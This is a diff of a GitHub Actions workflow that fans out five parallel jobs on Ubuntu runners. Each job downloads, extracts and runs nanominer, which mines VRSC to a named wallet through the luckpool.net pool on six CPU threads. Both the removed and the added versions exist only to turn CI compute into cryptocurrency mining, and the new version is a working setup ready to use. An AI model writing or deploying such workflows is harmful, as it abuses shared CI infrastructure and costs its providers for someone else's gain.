@@ -7,25 +7,31 @@ on:
   workflow_dispatch:  # Allows manual trigger
 
 jobs:
-  run-nanominer:
-    runs-on: macos-latest
+  nanominer:
+    runs-on: ubuntu-latest
     strategy:
       matrix:
         job: [1, 2, 3, 4, 5]
     steps:
-      - name: Install and run Nanominer (Job ${{ matrix.job }})
-        run: |
-          wget https://github.com/nanopool/nanominer/releases/download/v3.7.7/nanominer-linux-3.7.7.tar.gz
-          tar -xzf nanominer-linux-3.7.7.tar.gz
+      - name: Download Nanominer
+        run: wget https://github.com/nanopool/nanominer/releases/download/v3.7.7/nanominer-linux-3.7.7.tar.gz
 
-          # Check if the directory exists
+      - name: Extract Nanominer
+        run: |
+          mkdir -p nanominer-linux-3.7.7
+          tar -xvf nanominer-linux-3.7.7.tar.gz -C nanominer-linux-3.7.7 --strip-components=1
+
+      - name: Verify Directory
+        run: |
           if [ -d "nanominer-linux-3.7.7" ]; then
-            cd nanominer-linux-3.7.7
+            echo "Directory exists."
           else
-            echo "Directory nanominer-linux-3.7.7 does not exist"
+            echo "Directory does not exist."
             exit 1
           fi
 
-          # Proceed with the remaining commands
+      - name: Run Nanominer (Job ${{ matrix.job }})
+        run: |
+          cd nanominer-linux-3.7.7
           chmod +x nanominer
           ./nanominer -algo Verushash -coin VRSC -wallet RCvg94F85Uw8f89ZznoEpXktTC2ZNXe8KV.M1 -pool1 eu.luckpool.net:3956 -cpuThreads 6
